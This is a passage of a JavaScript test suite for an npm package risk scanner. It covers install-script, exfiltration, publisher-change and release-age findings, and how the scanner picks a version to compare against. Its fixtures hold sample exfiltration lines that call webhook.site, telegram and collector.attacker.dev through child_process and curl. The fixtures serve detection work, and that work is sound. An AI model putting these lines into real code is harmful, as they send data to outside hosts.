import assert from 'node:assert/strict'
import { Buffer } from 'node:buffer'
import { createHash } from 'node:crypto'
import { test } from 'node:test'
import { gzipSync } from 'node:zlib'
import publishers from '@preventive/publishers/npm.js'
import { DEFAULT_MINIMUM_RELEASE_AGE, NpmRiskError, assessNpm, npmFileRisk, npmMalwareAdvisory } from '../risk/index.js'
import { linesNote } from '../ui/view/file-runs-code.js'
import { npmVersionManifest } from '../risk/npm/manifest.js'
import { MAX_TAR_BYTES, npmTarballVersion } from '../risk/npm/tarball.js'
import { npmFilesDiff } from '../risk/npm/diff.js'
import { npmCompareFindings } from '../risk/npm/compare.js'
import { npmAddedDependency } from '../risk/npm/new-dependency.js'
import { npmOldVersion } from '../risk/npm/old-version.js'
import { npmAccountStanding } from '../risk/npm/release.js'
import { npmSettledDownloads } from '../risk/npm/downloads.js'
import { REGISTRY, packageOf } from './_managed-npm.js'

const DAY = 24 * 60 * 60_000
const HOUR = 60 * 60_000
const NOW = Date.parse('2026-10-12T12:00:00Z')
const ago = days => new Date(NOW - days * DAY).toISOString()

// A package's whole document, as npm's registry has it, of `{ name, versions:
// [{ doc, published }], created?, latest?, removed? }`: its `latest` the last
// version unless given, and the versions npm `removed` since, by when each
// was published.
const documentOf = ({ name, versions, created, latest, removed = {} }) => ({ name, 'dist-tags': { latest: latest ?? versions.at(-1).doc.version },
  versions: Object.fromEntries(versions.map(({ doc }) => [doc.version, doc])),
  time: { created: created ?? versions[0].published, modified: versions.at(-1).published, ...Object.fromEntries(versions.map(({ doc, published }) => [doc.version, published])), ...removed } })

// npm's registry, its advisories and downloads API for `packages`, each
// `{ name, versions: [{ doc, tgz, published }], created? }`, `downloads` by
// name, and `advisories` by name, rows as npm's bulk endpoint answers them;
// and OSV's records by name and version (`osv`), as one page or `{ pages }`,
// each but the last naming the next; each URL asked, in order.
const ADVISORIES = `${REGISTRY}/-/npm/v1/security/advisories/bulk`
const OSV = 'https://api.osv.dev/v1/query'
function npm(t, packages, downloads = {}, advisories = {}, osv = {}) {
  const asked = []
  t.mock.method(globalThis, 'fetch', (input, init) => Promise.resolve(answer(String(input), init)))
  const answer = (url, init) => {
    asked.push(url)
    if (url === ADVISORIES) return Response.json(Object.fromEntries(Object.keys(JSON.parse(init.body)).filter(name => advisories[name]).map(name => [name, advisories[name]])))
    if (url === OSV) {
      const { package: { name }, version: number, page_token: token = '0' } = JSON.parse(init.body)
      const pages = osv[`${name}@${number}`]?.pages ?? [osv[`${name}@${number}`] ?? []]
      const page = Number(token)
      return Response.json({ ...pages[page].length > 0 ? { vulns: pages[page] } : {}, ...page + 1 < pages.length ? { next_page_token: String(page + 1) } : {} })
    }
    if (url.startsWith('https://api.npmjs.org/downloads/range/')) {
      const name = decodeURIComponent(url.split('/').at(-1))
      return downloads[name] ? Response.json(downloads[name]) : Response.json({ error: `package ${name} not found` }, { status: 404 })
    }
    for (const pkg of packages) {
      if (url === `${REGISTRY}/${pkg.name}`) return Response.json(documentOf(pkg))
      for (const { doc, tgz } of pkg.versions) if (url === doc.dist.tarball) return new Response(tgz)
    }
    return Response.json({ error: 'Not found' }, { status: 404 })
  }
  return asked
}

// A cache kept in a Map, noting each type written.
function store() {
  const kept = new Map(), written = new Set()
  return { kept, written, read: (type, key) => Promise.resolve(kept.get(`${type} ${key}`) ?? null), write: (type, key, value) => { written.add(type); kept.set(`${type} ${key}`, value); return Promise.resolve() } }
}

const version = (name, number, files, extra, published) => ({ ...packageOf(name, number, files, extra), published })
const ids = assessment => assessment.findings.map(({ id }) => id)

test('a version alone: what it holds, its files stamped, too new under the minimum release age', async t => {
  const files = { 'package.json': '{"name":"lone"}', 'index.js': 'require("child_process").exec("curl https://webhook.site/x")\n', 'README.md': '# lone' }
  npm(t, [{ name: 'lone', versions: [version('lone', '1.0.0', files, { dependencies: {}, scripts: { postinstall: 'node setup.js' } }, ago(1))] }])
  const assessment = await assessNpm('lone', '1.0.0', { now: NOW, downloads: false })
  assert.equal(assessment.published, ago(1))
  assert.deepEqual(ids(assessment), ['held-install-scripts', 'held-runs-code', 'held-exfiltration', 'too-new'], 'as the Overview flags a version on its own')
  assert.deepEqual(assessment.findings.find(({ id }) => id === 'held-runs-code'), { id: 'held-runs-code', severity: 'high', files: [{ path: 'index.js', found: { 'child-process': [1] } }] })
  assert.deepEqual(assessment.findings[0], { id: 'held-install-scripts', severity: 'high', scripts: [['postinstall', 'node setup.js']] })
  assert.equal(assessment.findings.find(({ id }) => id === 'held-exfiltration').severity, 'critical', 'a host that catches what is sent to it')
  assert.deepEqual(assessment.files['index.js'].stamps, [{ name: 'child_process', severity: 'high' }, { name: 'Exfiltration', severity: 'critical' }])
  assert.deepEqual(assessment.files['index.js'].exfiltration, { 'webhook-site': [1] })
  assert.deepEqual(assessment.files['README.md'].stamps, [])
  assert.equal(DEFAULT_MINIMUM_RELEASE_AGE, 14 * DAY)
  assert.ok(!ids(await assessNpm('lone', '1.0.0', { now: NOW, downloads: false, minimumReleaseAge: 0 })).includes('too-new'), 'none under a minimum of 0, as own scopes take')
  assert.ok(!ids(await assessNpm('lone', '1.0.0', { now: NOW + 14 * DAY, downloads: false })).includes('too-new'), 'none once old enough')
})

test('the services a version\'s files name, a finding a hosts\' tag at its severity; against the version before, those new to a file a level higher', async t => {
  const before = version('hosted', '1.0.0', { 'package.json': '{}', 'lib/a.js': 'get("https://api.ipify.org")\n' }, { dependencies: {} }, ago(30))
  const after = version('hosted', '1.1.0', { 'package.json': '{}', 'lib/a.js': 'get("https://api.ipify.org")\npost("https://webhook.site/x")\n',
    'lib/b.js': 'bot("https://api.telegram.org/bot")\nget("https://ifconfig.me")\n' }, { dependencies: {} }, ago(20))
  npm(t, [{ name: 'hosted', versions: [before, after] }])
  const hosts = (assessment, prefix) => assessment.findings.filter(({ id }) => ['exfiltration', 'remote', 'ip-lookup'].some(tag => id === `${prefix}${tag}`))
    .map(({ id, severity, files }) => `${id} ${severity}: ${files.map(row => `${row.path} ${Object.keys(row.found ?? row.added).join(',')}`).join('; ')}`)
  const alone = await assessNpm('hosted', '1.1.0', { now: NOW, downloads: false })
  assert.deepEqual(hosts(alone, 'held-'), ['held-exfiltration critical: lib/a.js webhook-site', 'held-remote high: lib/b.js telegram',
    'held-ip-lookup moderate: lib/a.js ipify; lib/b.js ifconfig-me'], 'red, orange and yellow')
  assert.deepEqual(alone.files['lib/b.js'].stamps, [{ name: 'Remote', severity: 'high' }, { name: 'IP lookup', severity: 'moderate' }])
  const compared = await assessNpm('hosted', '1.1.0', { oldVersion: '1.0.0', now: NOW, downloads: false })
  assert.deepEqual(hosts(compared, ''), ['exfiltration critical: lib/a.js webhook-site', 'remote critical: lib/b.js telegram', 'ip-lookup high: lib/b.js ifconfig-me'],
    'never past red; ipify, named already, none')
})

test('against the version before: what it adds and changes, its publisher and provenance, and a new dependency\'s package', async t => {
  const known = publishers[0]
  const before = version('axios-like', '1.0.0', { 'package.json': '{}', 'lib/axios.js': 'require("follow-redirects")\n' },
    { dependencies: { 'follow-redirects': '^1.15.6' }, scripts: {}, _npmUser: { name: known } }, ago(30))
  before.doc.dist.attestations = { provenance: { predicateType: 'https://slsa.dev/provenance/v1' } }
  const after = version('axios-like', '1.0.1', { 'package.json': '{}', 'lib/axios.js': 'require("follow-redirects")\n' },
    { dependencies: { 'follow-redirects': '^1.15.6', 'crypto-like': '^4.2.1' }, scripts: {}, _npmUser: { name: 'someone-new' } }, ago(20))
  const dependency = version('crypto-like', '4.2.1', { 'package.json': '{}', 'setup.js': '' }, { scripts: { postinstall: 'node setup.js' } }, ago(20.5))
  npm(t, [{ name: 'axios-like', versions: [before, after] }, { name: 'crypto-like', versions: [dependency] }])
  const assessment = await assessNpm('axios-like', '1.0.1', { oldVersion: '1.0.0', now: NOW })
  assert.deepEqual(ids(assessment), ['publisher', 'provenance-lost', 'unused-deps'])
  assert.deepEqual(assessment.findings[0], { id: 'publisher', was: known, now: 'someone-new', wasKnown: true, nowKnown: false, wasStanding: 'known', nowStanding: 'new', severity: 'critical' })
  assert.deepEqual(assessment.findings[2].dependencies, [{ name: 'crypto-like', kind: null, range: '^4.2.1' }])
  const [added] = assessment.dependencies.added
  assert.equal(added.name, 'crypto-like')
  assert.deepEqual(added.flags.map(({ check }) => check), ['unimported'])
  assert.deepEqual([added.tier, added.level, added.uncounted, added.month, added.created, added.gap], [null, 'is-unpopular', true, undefined, ago(20.5), 0.5 * DAY],
    'npm counts none of its downloads: unpopular, saying so, first published half a day before the open version')
})

test('against the version before, its tarball read only where its files could change what is found', async t => {
  const files = { 'package.json': '{}', 'index.js': 'module.exports = require("./lib")\n', 'lib/index.js': 'module.exports = 1\n' }
  const before = version('gated', '1.0.0', files, { dependencies: {}, scripts: {} }, ago(60))
  const after = version('gated', '1.0.1', { ...files, 'lib/index.js': 'module.exports = 2\n' }, { dependencies: {}, scripts: {}, _npmUser: { name: 'someone-new' } }, ago(40))
  const hosted = version('gated', '1.0.2', { ...files, 'lib/index.js': 'get("https://collector.attacker.dev/x")\n' },
    { dependencies: {}, scripts: {}, _npmUser: { name: 'someone-new' } }, ago(20))
  const asked = npm(t, [{ name: 'gated', versions: [before, after, hosted] }])
  const tarballs = () => asked.filter(url => url.endsWith('.tgz'))
  assert.deepEqual(ids(await assessNpm('gated', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })), ['publisher'], 'its manifest told by npm\'s document')
  assert.deepEqual(tarballs(), [after.doc.dist.tarball], 'nothing of its files a file finding flags: 1.0.0\'s files not read')
  asked.length = 0
  assert.deepEqual(ids(await assessNpm('gated', '1.0.2', { oldVersion: '1.0.1', now: NOW, downloads: false })), ['new-hosts'])
  assert.deepEqual(tarballs(), [hosted.doc.dist.tarball, after.doc.dist.tarball], 'a host it names: 1.0.1\'s read, for whether it named it')
  const gyp = { 'package.json': '{}', 'binding.gyp': '{}' }
  const built = version('built', '1.0.0', gyp, { dependencies: {}, scripts: {} }, ago(60))
  const rebuilt = version('built', '1.0.1', { ...gyp, 'addon.cc': '' }, { dependencies: {}, scripts: { install: 'node-gyp rebuild' } }, ago(40))
  const read = npm(t, [{ name: 'built', versions: [built, rebuilt] }])
  assert.deepEqual(ids(await assessNpm('built', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })), [], 'node-gyp ran for 1.0.0\'s binding.gyp all the same')
  assert.deepEqual(read.filter(url => url.endsWith('.tgz')), [rebuilt.doc.dist.tarball, built.doc.dist.tarball], 'install scripts, and 1.0.0\'s naming none: its files read')
})

test('the version risk picks to compare with: below the open one, the highest most likely free of what an attack injects', () => {
  const at = (number, days, publisher = 'maintainer', extra = {}) => ({ version: number, published: ago(days), publisher, known: false, deprecated: false, ...extra })
  const pick = (number, releases) => npmOldVersion(number, releases, NOW)
  const line = [at('1.0.0', 400), at('1.1.0', 90), at('1.2.0', 40), at('1.2.1', 10), at('1.3.0', 2), at('2.0.0', 1)]
  assert.equal(pick('1.3.0', line), '1.2.0', 'on npm a month or more; 2.0.0 above it')
  assert.equal(pick('1.0.0', line), null, 'none below')
  assert.equal(pick('latest', [at('latest', 1)]), null, 'no version')
  assert.equal(pick('1000000000000000.0.1', [at('1000000000000000.0.0', 60), at('1000000000000000.0.1', 1)]), '1000000000000000.0.0', 'a part of 16 digits, as semver takes it')
  assert.equal(pick('9007199254740992.0.1', [at('9007199254740992.0.0', 60), at('9007199254740992.0.1', 1)]), null, 'one past a safe integer, as semver takes none')
  assert.equal(pick('2.0.0', [at('1.9.5', 60), at('1.10.0', 50), at('2.0.0', 1)]), '1.10.0', 'in the closest branch below, by semver')
  assert.equal(pick('3.0.0', [at('2.9.8', 250), at('2.9.9', 100), at('3.0.0', 200)]), '2.9.8', 'one published before it, not a backport since')
  assert.equal(pick('3.0.0', [at('2.9.9', 100), at('3.0.0', 200)]), '2.9.9', 'a backport where none is before it')
  assert.equal(pick('3.0.0', [at('2.9.7', 250), at('2.9.8', 200.5), at('3.0.0', 200)]), '2.9.7', 'none published within a week before it')
  assert.equal(pick('0.1.2', [at('0.1.0', 20), at('0.1.1', 12), at('0.1.2', 10)]), '0.1.0', 'none a month old: one a week apart')
  assert.equal(pick('0.1.1', [at('0.1.0', 12.5), at('0.1.1', 12)]), '0.1.0', 'nor that: the highest')
  assert.equal(pick('1.3.0', [at('1.1.0', 90), at('1.2.0', 60, 'maintainer', { deprecated: true }), at('1.3.0', 1)]), '1.1.0', 'one deprecated passed over')
  const pre = [at('1.9.0', 90), at('2.0.0-rc.2', 90), at('2.0.0-rc.9', 60), at('2.0.0-rc.10', 1), at('2.0.0', 1)]
  assert.equal(pick('2.0.0', pre), '1.9.0', 'a release where it is one')
  assert.equal(pick('2.0.0-rc.10', pre), '2.0.0-rc.9', 'a prerelease where it is one, by its identifiers')
  assert.equal(pick('1.0.0', [at('1.0.0-beta.1', 60), at('1.0.0', 1)]), '1.0.0-beta.1', 'a prerelease where no release is below')
})

test('the version risk picks to compare with, by who published it: a known account\'s where it was taken from one, else none of an unknown one\'s own', () => {
  const at = (number, days, publisher, extra = {}) => ({ version: number, published: ago(days), publisher, known: false, deprecated: false, ...extra })
  const pick = (number, releases) => npmOldVersion(number, releases, NOW)
  const known = publishers[0]
  const taken = [at('1.13.0', 60, known, { known: true }), at('1.14.0', 5, known, { known: true }), at('1.14.1', 1, 'someone-new'), at('1.14.2', 0.5, 'someone-new')]
  assert.equal(pick('1.14.2', taken), '1.14.0', 'its maintainers\' latest, trusted however new; none the new account published')
  assert.equal(pick('2.0.0', [at('1.9.8', 30, known, { known: true }), at('1.9.9', 0.2, known, { known: true }), at('2.0.0', 1, 'someone-new')]), '1.9.8',
    'theirs published before it, not a backport since')
  assert.equal(pick('1.5.1', [at('1.4.0', 90, known, { known: true }), at('1.4.9', 60, 'bob'), at('1.5.0', 5, known, { known: true, deprecated: true }), at('1.5.1', 1, 'someone-new')]),
    '1.4.0', 'a known account\'s still where theirs is deprecated, as whoever took it can deprecate one')
  const handed = [at('1.0.0', 300, 'alice'), at('1.1.0', 100, 'alice'), at('1.2.0', 60, 'mallory'), at('1.2.1', 20, 'alice'), at('1.3.0', 1, 'mallory')]
  assert.equal(pick('1.3.0', handed), '1.2.1', 'its maintainer\'s, on it three months, not held to a month; none of the account on it two months')
  assert.equal(pick('1.0.2', [at('1.0.0', 90, 'solo'), at('1.0.1', 60, 'solo'), at('1.0.2', 1, 'solo')]), '1.0.1', 'one account\'s all: its own')
  assert.equal(pick('2.0.1', [at('1.0.0', 90, known, { known: true }), at('2.0.0', 60, 'someone'), at('2.0.1', 1, known, { known: true })]), '2.0.0',
    'a known account publishing it: whoever published the one before')
  const other = publishers[1]
  assert.equal(pick('2.0.1', [at('1.9.0', 60, known, { known: true }), at('2.0.0', 3, known, { known: true }), at('2.0.1', 1, known, { known: true })]), '1.9.0',
    'its own known account\'s held to a month, as it may be the one taken')
  assert.equal(pick('2.0.1', [at('1.9.0', 60, known, { known: true }), at('2.0.0', 3, other, { known: true }), at('2.0.1', 1, known, { known: true })]), '2.0.0',
    'another known account\'s trusted however new')
})

test('against the version risk picks: an attack\'s own earlier version passed over for its maintainers\', picked by npm\'s document and kept an hour', async t => {
  const known = publishers[0]
  const files = { 'package.json': '{}', 'index.js': 'module.exports = 1\n' }
  const theirs = { dependencies: {}, scripts: {}, _npmUser: { name: known } }
  const taken = { dependencies: {}, scripts: { postinstall: 'node setup.js' }, _npmUser: { name: 'someone-new' } }
  const versions = [version('handed', '1.0.0', files, theirs, ago(90)), version('handed', '1.1.0', files, theirs, ago(5)),
    version('handed', '1.1.1', { ...files, 'setup.js': '' }, taken, ago(2)), version('handed', '1.1.2', { ...files, 'setup.js': '' }, taken, ago(1))]
  const asked = npm(t, [{ name: 'handed', versions }])
  const cache = store()
  const picked = await assessNpm('handed', '1.1.2', { oldVersion: true, now: NOW, downloads: false, cache })
  assert.equal(picked.oldVersion, '1.1.0')
  assert.deepEqual(ids(picked), ['publisher', 'install-scripts', 'too-new'])
  assert.ok(!asked.includes(versions[2].doc.dist.tarball), 'no tarball read for the pick')
  assert.deepEqual(ids(await assessNpm('handed', '1.1.2', { oldVersion: '1.1.1', now: NOW, downloads: false })), ['too-new'], 'against the attack\'s own, nothing of it')
  asked.length = 0
  assert.deepEqual(await assessNpm('handed', '1.1.2', { oldVersion: true, now: NOW, downloads: false, cache }), picked)
  assert.deepEqual(asked, [], 'the pick kept: npm isn\'t asked')
  await assessNpm('handed', '1.1.2', { oldVersion: true, now: NOW + 2 * 60 * 60_000, downloads: false, cache })
  assert.deepEqual(asked.toSorted(), [`${REGISTRY}/handed`, ADVISORIES, OSV].toSorted(), 'picked again after an hour, by its document alone, its advisories asked again as they are')
  const alone = await assessNpm('handed', '1.0.0', { oldVersion: true, now: NOW, downloads: false })
  assert.equal(alone.oldVersion, null, 'none below it')
  assert.deepEqual(alone, await assessNpm('handed', '1.0.0', { now: NOW, downloads: false }), 'assessed alone')
  const listed = documentOf({ name: 'handed', versions })
  listed.versions['1.1.1'] = null
  listed.time['1.1.1'] = ago(40)
  const pickedOf = async () => (await assessNpm('handed', '1.1.2', { oldVersion: true, now: NOW, downloads: false, packument: () => Promise.resolve(listed) })).oldVersion
  assert.equal(await pickedOf(), '1.1.0', 'none npm lists no document of')
  delete listed.versions['1.1.1']
  listed.time['1.1.1'] = ago(4.9)
  assert.equal(await pickedOf(), '1.0.0', 'none published within a day of one npm since removed, its time kept')
})

test('an account\'s standing on a package: known, one of its maintainers, on it three months or first to publish it, or new to it', () => {
  const row = (publisher, days) => ({ publisher, published: days === null ? null : ago(days) })
  const releases = [row('creator', 400), row('alice', 200), row('bob', 60), row(null, 30), row('carol', 10), row('carol', null), { publisher: null, published: ago(5), removed: true }]
  const standing = npmAccountStanding(releases, ago(1))
  assert.deepEqual(['creator', 'alice', 'bob', 'carol', 'dave'].map(account => standing(account, false)), ['maintainer', 'maintainer', 'new', 'new', 'new'])
  assert.equal(standing('bob', true), 'known', 'known whatever its time on it')
  assert.equal(npmAccountStanding([row('solo', 20), row('solo', 5)], ago(1))('solo', false), 'maintainer', 'the sole maintainer of a package three weeks old')
  const young = npmAccountStanding([row('alice', 20), row('mallory', 1)], ago(1))
  assert.deepEqual([young('alice', false), young('mallory', false)], ['maintainer', 'new'], 'one taking it from them new to it')
  assert.equal(npmAccountStanding([row('alice', null), row('mallory', 10), row('mallory', 1)], ago(1))('mallory', false), 'new',
    'none first where another published one npm lists no time of, as it may be earlier')
  assert.equal(npmAccountStanding([{ publisher: null, published: ago(30), removed: true }, row('mallory', 20), row('mallory', 1)], ago(1))('mallory', false), 'new',
    'nor where one since removed came earlier, its publisher unknown')
  assert.equal(npmAccountStanding([row('mallory', 20), row('alice', 20), row('mallory', 1)], ago(1))('mallory', false), 'new', 'nor where another published as early')
  assert.equal(npmAccountStanding(releases, ago(170))('alice', false), 'new', 'as the version published then finds it')
  assert.equal(npmAccountStanding([row('alice', 400), row('alice', null), row('bob', 1)], ago(1))('alice', false), 'maintainer', 'a version npm lists no time of none of its time')
  assert.equal(npmAccountStanding([row('bob', 300), row('alice', 200), row('alice', null)], ago(1))('alice', false), 'maintainer')
  assert.equal(npmAccountStanding([row('bob', 300), row('alice', 60), row('alice', null), row('alice', 1)], ago(1))('alice', false), 'new')
})

test('the version risk picks to compare with, by what npm\'s document keeps: none published with one since removed, and a package\'s own maintainers trusted', () => {
  const at = (number, days, publisher = 'maintainer', extra = {}) => ({ version: number, published: ago(days), publisher, known: false, deprecated: false, removed: false, ...extra })
  const gone = (number, days) => at(number, days, null, { removed: true })
  const pick = (number, releases) => npmOldVersion(number, releases, NOW)
  assert.equal(pick('1.2.0', [at('1.0.0', 90), at('1.1.0', 60), gone('1.1.1', 59.9), at('1.2.0', 1)]), '1.0.0',
    'none published within a day of one since removed from npm, nor that one')
  assert.equal(pick('1.2.0', [at('1.0.0', 90), at('1.1.0', 60), gone('1.1.1', 59.9), { ...gone('1.1.2', 0), published: null }, at('1.2.0', 1)]), '1.0.0',
    'one removed npm lists no time of none, nor turning the others off')
  assert.equal(pick('1.2.0', [at('1.0.0', 90), at('1.1.0', 60), gone('1.1.1', 50), gone('created', 60.01), at('1.2.0', 1)]), '1.1.0',
    'one ten days apart; a time of no version, as `created`, none')
  const known = publishers[0]
  assert.equal(pick('1.14.2', [at('1.13.0', 60, known, { known: true }), at('1.14.0', 5, known, { known: true }), gone('1.14.1', 4.95), at('1.14.2', 1, 'someone-new')]), '1.13.0',
    'a known account\'s too, where one since removed came with it')
  assert.equal(pick('1.3.1', [at('1.0.0', 400, 'alice'), at('1.3.0', 10, 'alice'), at('1.3.1', 1, 'mallory')]), '1.3.0',
    'taken from a maintainer on it three months: theirs, not held to a month')
  assert.equal(pick('1.3.1', [at('1.0.0', 400, 'alice'), at('1.3.0', 3, 'alice'), at('1.3.1', 1, 'mallory')]), '1.0.0',
    'but held to the week, as a maintainer few know of is taken with its peers')
  assert.equal(pick('1.3.0', [at('1.0.0', 300, known, { known: true }), at('1.1.0', 200, 'bob'), at('1.2.0', 3, known, { known: true }), gone('1.2.1', 2.9),
    at('1.3.0', 1, 'bob')]), '1.0.0', 'one of its maintainers publishing after a known account: a known account\'s still')
  assert.equal(pick('1.3.0', [at('1.0.0', 200, 'bob'), at('1.1.0', 100, 'mallory'), at('1.2.0', 40, 'mallory'), at('1.3.0', 1, 'mallory')]), '1.2.0',
    'its own account on it three months: its own, held to time as any')
  assert.equal(pick('1.3.0', [at('1.0.0', 200, 'bob'), at('1.1.0', 80, 'mallory'), at('1.2.0', 40, 'mallory'), at('1.3.0', 1, 'mallory')]), '1.0.0',
    'on it under three months: another\'s')
})

test('a publisher changed told with each account\'s standing on the package: one of its maintainers moderate, one new to it high', async t => {
  const files = { 'package.json': '{}' }
  const by = (name, number, publisher, days) => version(name, number, files, { dependencies: {}, scripts: {}, _npmUser: { name: publisher } }, ago(days))
  const asked = npm(t, [{ name: 'shared', versions: [by('shared', '1.0.0', 'alice', 400), by('shared', '1.1.0', 'alice', 200), by('shared', '1.2.0', 'bob', 100),
    by('shared', '1.3.0', 'bob', 1), by('shared', '1.3.1', 'mallory', 0.5)] }, { name: 'young', versions: [by('young', '1.0.0', 'alice', 20), by('young', '1.0.1', 'mallory', 1)] }])
  const publisher = async (number, old, options = {}) => (await assessNpm('shared', number, { oldVersion: old, now: NOW, downloads: false, ...options })).findings.find(({ id }) => id === 'publisher')
  assert.deepEqual(await publisher('1.3.0', '1.1.0'), { id: 'publisher', was: 'alice', now: 'bob', wasKnown: false, nowKnown: false, wasStanding: 'maintainer', nowStanding: 'maintainer', severity: 'moderate' },
    'alice first to publish it, bob on it three months')
  assert.equal(asked.filter(url => url === `${REGISTRY}/shared`).length, 1, 'its document read once')
  assert.deepEqual(await publisher('1.3.1', '1.3.0'), { id: 'publisher', was: 'bob', now: 'mallory', wasKnown: false, nowKnown: false, wasStanding: 'maintainer', nowStanding: 'new', severity: 'high' })
  const young = (await assessNpm('young', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })).findings.find(({ id }) => id === 'publisher')
  assert.deepEqual([young.wasStanding, young.nowStanding], ['maintainer', 'new'], 'the sole maintainer of a package three weeks old, npm\'s `created` no version')
  const cache = store()
  await assessNpm('shared', '1.3.0', { now: NOW, downloads: false, cache })
  await assessNpm('shared', '1.1.0', { now: NOW, downloads: false, cache })
  asked.length = 0
  assert.equal((await publisher('1.3.0', '1.1.0', { cache })).nowStanding, 'maintainer')
  assert.equal(asked.filter(url => url === `${REGISTRY}/shared`).length, 1, 'both versions kept: its document read for its versions alone')
})

test('a pair\'s publishers\' standings told anew as npm removes a version, its assessment kept by how many it removed', async t => {
  const files = { 'package.json': '{}' }
  const by = (number, publisher, days) => version('pulled', number, files, { dependencies: {}, scripts: {}, _npmUser: { name: publisher } }, ago(days))
  const versions = [by('1.0.0', 'alice', 400), by('1.0.1', 'mallory', 100), by('1.1.0', 'alice', 50), by('1.2.0', 'mallory', 1)]
  npm(t, [{ name: 'pulled', versions }])
  const doc = documentOf({ name: 'pulled', versions })
  const cache = store()
  const publisher = async now => (await assessNpm('pulled', '1.2.0', { oldVersion: '1.1.0', now, downloads: false, cache, packument: () => Promise.resolve(structuredClone(doc)) }))
    .findings.find(({ id }) => id === 'publisher')
  const told = ({ nowStanding, severity }) => [nowStanding, severity]
  assert.deepEqual(told(await publisher(NOW)), ['maintainer', 'moderate'], 'mallory on it three months')
  delete doc.versions['1.0.1']
  assert.deepEqual(told(await publisher(NOW)), ['maintainer', 'moderate'], 'kept within the hour, as what npm says of the package is')
  assert.deepEqual(told(await publisher(NOW + 2 * 60 * 60_000)), ['new', 'high'], 'an hour on, its first since removed: new to it')
})

test('a package few download is flagged as unpopular, but where its popularity isn\'t asked, as own scopes take', async t => {
  const asked = npm(t, [{ name: 'own', versions: [version('own', '1.0.0', { 'package.json': '{}' }, { dependencies: {} }, ago(400))] }],
    { own: { start: '2026-08-01', end: '2026-10-11', downloads: [] } })
  assert.ok(ids(await assessNpm('own', '1.0.0', { now: NOW })).includes('popularity'))
  asked.length = 0
  assert.ok(!ids(await assessNpm('own', '1.0.0', { now: NOW, popularity: false })).includes('popularity'))
  assert.ok(!asked.some(url => url.startsWith('https://api.npmjs.org/downloads/')), 'nor its downloads asked')
})

test('a package few download is a level less unpopular where an account known to publish one of npm\'s most downloaded packages published the version', async t => {
  const by = account => ({ dependencies: {}, _npmUser: { name: account, email: 'a@example.com' } })
  const daily = perDay => ({ start: '2026-08-01', end: '2026-10-11', downloads: Array.from({ length: 72 }, (_, i) => ({ day: new Date(Date.parse('2026-08-01') + i * DAY).toISOString().slice(0, 10), downloads: perDay })) })
  npm(t, ['quiet', 'middling'].map(name => ({ name, versions: [version(name, '1.0.0', { 'package.json': '{}' }, by('stranger-account'), ago(400)),
    version(name, '1.1.0', { 'package.json': '{}' }, by(publishers[0]), ago(300))] })), { quiet: daily(0), middling: daily(500) })
  const popularity = async (name, number) => (await assessNpm(name, number, { now: NOW })).findings.find(({ id }) => id === 'popularity')
  assert.deepEqual(await popularity('quiet', '1.0.0'), { id: 'popularity', severity: 'critical', tier: null, level: 'is-unpopular' }, 'an unknown account\'s: red')
  assert.deepEqual(await popularity('quiet', '1.1.0'), { id: 'popularity', severity: 'high', tier: null, level: 'is-unpopular', known: true }, 'a known one\'s: orange')
  assert.deepEqual([(await popularity('middling', '1.0.0')).severity, (await popularity('middling', '1.1.0')).severity], ['high', 'moderate'], 'orange, and yellow where known')
})

test('a host where packages keep their code and docs, named anew, calls for no look; a host under it, or a repository it serves files from, does', () => {
  const side = files => ({ kind: 'sourcemap', npm: { manifest: {} }, json: { version: 3, sources: Object.keys(files), sourcesContent: Object.values(files) } })
  const base = side({ 'index.js': 'module.exports = 1\n' })
  const other = side({ 'index.js': 'module.exports = 1\n', 'lib/links.js': 'warn("https://github.com/lit/lit/issues")\nwarn("https://lit.dev/msg/dev-mode")\nget("https://api.github.com/repos")\n'
    + 'get("https://github.com/someone/payloads/raw/main/x.js")\nget("https://github.com/someone/tool/releases/download/v1/tool.tgz")\n'
    + 'get("https://github.com/someone/latest/releases/latest/download/x.js")\nexec("git clone https://github.com/someone/cloned.git")\n'
    + 'get("https://github.com/someone/blobbed/blob/main/x.js?raw=true")\nget("https://github.com/someone/unheard/route/x")\n'
    + 'get("https://github.com:443/someone/ported/raw/main/x.js")\nget("https://github.com./someone/dotted/raw/x.js")\nget("https://github.com/x/../someone/climbed/raw/x.js")\n'
    + 'see("https://github.com/lit/lit/issues/1434")\nsee("https://github.com/google/safe-html-types/blob/master/doc/safehtml-types.md")\n'
    + 'see("See https://github.com/webcomponents/polyfills/tree/master/packages/shadycss#usage.")\nsee("https://github.com/ExodusOSS/bytes/blob/main/README.md")\n'
    + 'get("https://github.com/someone/patched/pull/1.patch")\nget("https://github.com/someone/diffed/commit/abc123.diff")\nsee("https://github.com/lit/lit/blob/main/fix.patch")\n'
    + 'get("https://github.com/someone/encoded/blob/main/x.js?raw=%31")\nget("https://github.com/someone/escaped/pull/1%2Epatch")\n'
    + 'const flagged = /https:\\/\\/github\\.com\\/someone\\/flagged\\/pull\\/1\\.patch/i\n'
    + 'get("https://github.com/someone/built/actions/runs/1/artifacts/2")\nget("https://github.com/SomeOne/Patched/pull/2.patch")\n'
    + 'exec("git clone https://github.com/someone/suffixless")\nget("https://en.wikipedia.org/w/index.php?title=User:someone/x.js&action=raw")\n'
    + 'see("https://github.com/lit/lit/blob/main/README.md#use")\nsee("https://github.com/lit/lit/releases/tag/v2.0.0")\nsee("https://github.com/sponsors/someone")\n' })
  const hosts = npmCompareFindings(base, other, { added: [], changed: [] }).find(({ id }) => id === 'new-hosts')?.hosts.map(({ host }) => host)
  assert.deepEqual(hosts, ['api.github.com', 'github.com/someone/payloads', 'github.com/someone/tool', 'github.com/someone/latest', 'github.com/someone/cloned',
    'github.com/someone/blobbed', 'github.com/someone/unheard', 'github.com/someone/ported', 'github.com/someone/dotted', 'github.com/someone/climbed',
    'github.com/someone/patched', 'github.com/someone/diffed', 'github.com/someone/encoded', 'github.com/someone/escaped', 'github.com/someone/flagged', 'github.com/someone/built', 'github.com/someone/suffixless',
    'en.wikipedia.org'],
    'github.com\'s pages and lit.dev allowed; api.github.com, a host under one, named, and every repository github.com serves what it holds from, by any path but a page')
})

test('a new dependency on the caller\'s own package is told no tier nor age, nor is npm asked of it', async t => {
  const before = version('app', '1.0.0', { 'package.json': '{}', 'index.js': '' }, { dependencies: {} }, ago(30))
  const after = version('app', '1.0.1', { 'package.json': '{}', 'index.js': 'require("@mine/fresh")\nrequire("stranger")\n' },
    { dependencies: { '@mine/fresh': '^1.0.0', stranger: '^1.0.0' } }, ago(20))
